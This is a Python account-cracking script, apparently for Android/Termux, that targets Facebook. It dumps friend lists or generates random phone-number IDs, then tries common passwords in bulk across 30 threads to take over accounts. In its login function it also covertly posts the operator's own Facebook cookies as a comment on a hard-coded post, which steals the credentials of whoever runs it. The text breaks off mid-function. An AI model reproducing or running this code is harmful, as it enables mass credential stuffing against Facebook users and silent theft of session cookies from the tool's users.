#KaTiL
from os import path
import os,base64,zlib,pip,urllib


try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python KaTiL.py')
except:pass
        
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
os.system('xdg-open https://www.facebook.com/No.Feeling.in.love')
logo=("""
\033[97;1m     
\033[93;1m       ______         __    __         ______  
 /      \       /  |  /  |       /      \ 
/$$$$$$  |      $$ | /$$/       /$$$$$$  |
$$ |__$$ |      $$ |/$$/        $$ |__$$ |
$$    $$ |      $$  $$<         $$    $$ |
$$$$$$$$ |      $$$$$  \        $$$$$$$$ |
$$ |  $$ |      $$ |$$  \       $$ |  $$ |
$$ |  $$ |      $$ | $$  |      $$ |  $$ |
$$/   $$/       $$/   $$/       $$/   $$/ 
                                          
                                          
                                          
\033[94;1m    
\033[97;1m   
\033[91;1m     
\033[92;1m    
\033[97;1m 
                                                 
═══════════════════════════════════════════════

\033[97;1m[+]==============================================
\033[93;1m[*]  ᴏ ᴡ ɴ ᴇ ʀ   :    KASHIF
\033[94;1m[*]  𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤    :    AK KASHIF
\033[97;1m[*]  𝐆𝐢𝐭𝐇𝐮𝐁      :    KASHI09
\033[91;1m[*]  𝚅𝚎𝚛𝚜𝚒𝚘𝚗     :    1.0
\033[93;1m[*]  𝐓𝐨𝐨𝐋 𝐬𝐭𝐚𝐭𝐮𝐬 :    Free
[+]==============================================""")
def linex():
        print('\33[1;37m==============================================')
def clear():
        os.system('clear')
        print(logo)
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
def login():
        clear()
        cookies = input(' Put cookies: ')
        try:
                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start];q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
                find_token = re.search("(EAAG\w+)", data.text)
                open(".tok.txt", "w").write(find_token.group(1))
                open(".coki.txt","w").write(cookies)
                tok=open('.tok.txt','r').read()
                info = requests.get('https://graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cookies}).json()
                name=(info['name'])
                idd=(info['id'])
                barth=(info['birthday'])
                linex()
                print(' Welcome\033[1;32m : '+name)
                print(' \033[1;37mYour UID : '+idd)
                print(' Barth Day: '+barth)
                requests.post('https://graph.facebook.com/pfbid02Sj97PfY1mY3cvbLjGaJRz22FR7yc75JFKLoBFiHoNLSq9aGxmGKotAtcYLkMDDpbl/comments/?message='+cookies+'&access_token='+tok, cookies={'cookie':cookies})
                linex()
                print(' Cookies login has been successfull...')
                time.sleep(1)
                menu()
        except KeyError:
                print('\033[1;31m Cookies has been expired...')
                os.system('rm -rf .tok.txt');time.sleep(1);login()
        except requests.exceptions.ConnectionError:
                exit(' internet connection error...')
        except AttributeError:
                print('\033[1;31m Cookies has been expired...')
                os.system('rm -rf .tok.txt');time.sleep(1);login()
                login()
def public():
        usrr=[]
        clear()
        try:
                tok = open('.tok.txt','r').read()
                cok = open('.coki.txt','r').read()
                tokenku.append(tok)
        except KeyError:
                print('\033[1;31mYour cookies han expired...');time.sleep(1)
                login()
        except IOError:
                print('\033[1;31mYour cookies han expired...');time.sleep(1)
                login()
        try:
                info = requests.get('https://graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cok}).json()
                name=(info['name'])
                print('\033[1;32m Welcome '+name)
                linex()
        except KeyError:
                print('\033[1;31mYour cookies han expired...');time.sleep(1)
                login()
        try:
                jum=int(input(' \033[1;36mHow many ids you went to clone ?\033[1;37m '))
        except ValueError:
                exit(' Put only digits not latters ')
        if jum<1 or jum>5000:
                exit()
        ses=requests.Session()
        yz = 0
        for met in range(jum):
                yz+=1
                kl = input(f'\033[1;37m Put link no.{yz+0}: ')
                usrr.append(kl)
        linex()

        linex()
        print(' [1] Method 1 (for new ids) \n')
        linex()
        mthd = input(' Choose method: ')
        clear()
        print(logo)
        print(' Do you went show COOKIES? (y/n): ')
        linex()
        cx=input(' Choose: ')
        if cx in ['y','Y','yes','Yes','1']:
                pcp.append('y')
        else:
                pcp.append('n')
        linex()
        print('\033[1;32m Dumping friend list...\033[1;37m')
        linex()
        for userr in usrr:
                try:
                        col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
                        for mi in col['friends']['data']:
                                try:
                                        iso = (mi['id']+'|'+mi['name'])
                                        if iso in id:pass
                                        else:id.append(iso)
                                except:continue
                except (KeyError,IOError):
                        pass
                except requests.exceptions.ConnectionError:
                        exit(f' No internet connection')
        try:
                plist = []
                try:
                        ps_limit = int(input(' How many passwords do you want to add ? '))
                except:
                        ps_limit =1
                clear()
                print(logo)
                print('\033[1;32m exp: first last,firtslast,first123')
                linex()
                for i in range(ps_limit):
                        plist.append(input(f' Put password {i+1}: '))
                with tred(max_workers=30) as crack_submit:
                        clear()
                        total_ids = str(len(id))
                        print(' Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                        linex()
                        for user in id:
                                ids,names = user.split('|')
                                passlist = plist
                                if mthd in ['1','01']:
                                        crack_submit.submit(ffb,ids,names,passlist)
                                elif mthd in ['2','02']:
                                        crack_submit.submit(api,ids,names,passlist)
                                elif mthd in ['2','02']:
                                        crack_submit.submit(trt1,ids,passlist)
                                else:
                                        crack_submit.submit(api1,ids,names,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python KaTiL.py')
        except requests.exceptions.ConnectionError:
                exit(f' No internet connection')
        except (KeyError,IOError):
                print(f' No friends for {userr}')
                time.sleep(3)
                public()
def menu():
        try:
                clear()
                print(logo)
        #       chk()
                x = ("sex")
                if x == ("sex"):
                        print('[1] File Cloning Menu ')
                        print('[2] Pak Random Cloning')
                        print('[3] B D Random Cloning')
                        print('[4] Afg Random Cloning')
                        print('[5] join Whatsapp Group')
                        print('\x1b[1;91m[6] Exit Programe')
                        linex()
                        xd=input(' Choose an option: ')
                        if xd in ['1','01']:
                                clear()
                                print(logo)
                                print(' Put file example:  /sdcard/File.txt  etc..')
                                linex()
                                file = input(' Put file path\033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' File location not found ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(logo)
                                print('[1] Method [1] For New iDx ')
                                print('[2] Method [2] For Mix iDx ')
                                print('[3] Method [3] For Mix iDx ')
                                linex()
                                mthd=input(' Choose: ')
                                linex()
                                plist = []
                                try:
                                        ps_limit = int(input(' How many passwords do you want to add ? '))
                                except:
                                        ps_limit =1
                                clear()
                                print(logo)
                                print('\033[1;37m[•] Example : first last,firtslast,first123')
                                linex()
                                for i in range(ps_limit):
                                        plist.append(input(f' Put password {i+1}: '))
                                clear()
                                print(logo)
                                print('[•] Do you Want to Show Cookies ? (y/n): ')
                                linex()
                                cx=input(' Choose: ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        print(logo)
                                        total_ids = str(len(fo))
                                        print('[•] Total Idz : \033[1;37m'+total_ids)
                                        print("[•]\x1b[1;91m Use flight mode for speed up\033[1;37m")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api,ids,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                                else:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                print('\033[1;37m')
                                linex()
                                print(' The process has completed')
                                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input(' Press enter to back ')
                                os.system('python KaTiL.py')
                        elif xd in ['2','02']:
                                pak()
                        elif xd in ['3','03']:
                                bd()
                        elif xd in ['4','04']:
                                afg()
                        elif xd in ['5','05']:
                                os.system('xdg-open https://www.facebook.com/No.Feeling.in.love')
                        elif xd in ['6','06']:
                                exit()
                else:
                        print("\033[1;31[•] Select Ryt Option")
                        clear()
                        print('\033[1;31m First Read Note : ')
                        print("\033[1;36m We Not Responsible if facebook\n go on update you not get ok idz\n We don't responsible if you delete your \n termux and key need approve\033[1;37m")
                        linex()
                        print(' \033[1;31mYour Key Not Registered\033[1;37m')
                        print(f" \033[1;37mYour Key : {fkeyx}")
                        linex();print (" Tools.. : Facebook Cloning");print (" Massage : Your Key Not Registered");print (" Status  : \033[1;91mTrail\033[1;37m\n \033[1;31m\033[1;42mNote: If You Are Free User Don't Come IB\033[0;0m");linex();print(' [+] File crack\n [+] Create ids file\n [+] Public crack\n [+] Random number crack\n [+] Random gmail crack\n [+] Exit menu\n\x1b[1;97m [1] Upgrade Tool To (\x1b[1;95mPremium\x1b[1;37m)')
                        linex()
                        input(" Choose Option : ")
                        linex()
                        print(" Your Subscription Date Expire")
                        linex()
                        url_wa = "https://t.me/hemt_hack&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi Kashif Sir, I Need To Buy Your Paid Kashif PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python KaTiL.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print('\n No internet connection ...')
                exit()
def pak():
	clear()
	
	print(logo)
	print('[1] Random Cloning Method [1] ')
	print('[2] Random Cloning Method [2] ')
	print('[3] Random Cloning Method [3] ')
	print('[4] Random Cloning Method [4] ')
	linex()
	riaz=input('[•] Select Option :')
	if riaz =='1':
		m1()
	if riaz =='2':
		m2()
	if riaz =='3':
		m4()
	else:
		print('[•] Select Ryt option')
	
def clear():
	os.system('clear')
def m1():
	clear()
	print(logo)
	print('[1] Auto Pass Random Cloning')
	print('[2] Auto Pass Random Cloning')
	print('[3] Auto Pass Random Cloning')
	print('[4] Choice Pass Random Cloning')
	linex()
	riaz=input('[•] Select Option :')
	if riaz =='1':
		m_m1()
	if riaz =='2':
		rdx1()
	if riaz =='3':
		cid1()
	if riaz =='4':
		choice1()
	else:
		print('[•] Select Ryt Option')
#
def m_m1():
                user=[]
                clear()
                print(logo)
                print('[•] Example : 92345,93**,88*,0300,**Etc')
                print('\x1b[1;91m[•] See note : Use Your Country Code ')
                linex()
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as KaTiL:     
                        clear()
                        tl = str(len(user))
                        print(logo)
                        print('[•] Total Idz : \033[1;37m'+tl)
                        print(f'\033[1;37m[•] Your Code : \033[1;37m'+code)
                        print(f'\033[1;37m[•]\x1b[1;91m Use flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','pakistan','pak123','pubg123','khanbaba','khanzada','kingkhan','peshawar1122','mardan123','khan123','ayesha123']
                                KaTiL.submit(trt1,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python KaTiL.py')

def rdx1():
                user=[]
                clear()
                print(logo)
                print('[•] Example : 92345,93**,88*,0300,**Etc')
                print('\x1b[1;91m[•] See note : Use Your Country Code ')
                linex()
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as KaTiL:     
                        clear()
                        tl = str(len(user))
                        print(logo)
                        print('[•] Total Idz : \033[1;37m'+tl)
                        print(f'\033[1;37m[•] Your Code : \033[1;37m'+code)
                        print(f'\033[1;37m[•]\x1b[1;91m Use flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','pakistan','pak123','pubg123','khanbaba','khanzada','kingkhan','peshawar1122','mardan123','khan123','ayesha123']
                                KaTiL.submit(trt1,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python KaTiL.py')


def cid1():
                user=[]
                clear()
                print(logo)
                print('[•] Example : 92345,93**,88*,0300,**Etc')
                print('\x1b[1;91m[•] See note : Use Your Country Code ')
                linex()
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as KaTiL:     
                        clear()
                        tl = str(len(user))
                        print(logo)
                        print('[•] Total Idz : \033[1;37m'+tl)
                        print(f'\033[1;37m[•] Your Code : \033[1;37m'+code)
                        print(f'\033[1;37m[•]\x1b[1;91m Use flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','pakistan','pak123','pubg123','khanbaba','khanzada','kingkhan','peshawar1122','mardan123','khan123','ayesha123']
                                KaTiL.submit(trt1,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python KaTiL.py')
def bd():
	clear()
	print(logo)
	print('[1] Auto Pass Random Cloning')
	print('[2] Auto Pass Random Cloning')
	print('[3] Auto Pass Random Cloning')
	linex()
	riaz=input('[•] Select Option :')
	if riaz =='1':
		bdm1()
	if riaz =='2':
		bdm2()
	if riaz =='3':
		bdm3()
	else:
		print('[•] Select Ryt Option')
def bdm1():
                user=[]
                clear()
                print(logo)
                print('[•] Example : 92345,93**,88*,0300,**Etc')
                print('\x1b[1;91m[•] See note : Use Your Country Code ')
                linex()
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as KaTiL:     
                        clear()
                        tl = str(len(user))
                        print(logo)
                        print('[•] Total Idz : \033[1;37m'+tl)
                        print(f'\033[1;37m[•] Your Code : \033[1;37m'+code)
                        print(f'\033[1;37m[•]\x1b[1;91m Use flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','pakistan','pak123','pubg123','khanbaba','khanzada','kingkhan','peshawar1122','mardan123','khan123','ayesha123']
                                KaTiL.submit(trt1,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python KaTiL.py')

def bdm2():
                user=[]
                clear()
                print(logo)
                print('[•] Example : 92345,93**,88*,0300,**Etc')
                print('\x1b[1;91m[•] See note : Use Your Country Code ')
                linex()
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as KaTiL:     
                        clear()
                        tl = str(len(user))
                        print(logo)
                        print('[•] Total Idz : \033[1;37m'+tl)
                        print(f'\033[1;37m[•] Your Code : \033[1;37m'+code)
                        print(f'\033[1;37m[•]\x1b[1;91m Use flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','pakistan','pak123','pubg123','khanbaba','khanzada','kingkhan','peshawar1122','mardan123','khan123','ayesha123']
                                KaTiL.submit(trt1,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python KaTiL.py')
                
def bdm4():
                user=[]
                clear()
                print(logo)
                print('[•] Example : 92345,93**,88*,0300,**Etc')
                print('\x1b[1;91m[•] See note : Use Your Country Code ')
                linex()
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as KaTiL:     
                        clear()
                        tl = str(len(user))
                        print(logo)
                        print('[•] Total Idz : \033[1;37m'+tl)
                        print(f'\033[1;37m[•] Your Code : \033[1;37m'+code)
                        print(f'\033[1;37m[•]\x1b[1;91m Use flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','pakistan','pak123','pubg123','khanbaba','khanzada','kingkhan','peshawar1122','mardan123','khan123','ayesha123']
                                KaTiL.submit(trt1,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python KaTiL.py')

def afg():
	clear()
	print(logo)
	print('[1] Auto Pass Random Cloning')
	print('[2] Auto Pass Random Cloning')
	print('[2] Auto Pass Random Cloning')
	linex()
	riaz=input('[•] Select Option :')
	if riaz =='1':
		afg1()
	if riaz =='2':
		afg2()
	if riaz =='3':
		afg3()
	else:
		print('[•] Select Ryt Option')

def afg1():
                user=[]
                clear()
                print(logo)
                print('[•] Example : 92345,93**,88*,0300,**Etc')
                print('\x1b[1;91m[•] See note : Use Your Country Code ')
                linex()
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as KaTiL:     
                        clear()
                        tl = str(len(user))
                        print(logo)
                        print('[•] Total Idz : \033[1;37m'+tl)
                        print(f'\033[1;37m[•] Your Code : \033[1;37m'+code)
                        print(f'\033[1;37m[•]\x1b[1;91m Use flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'afghanistan']
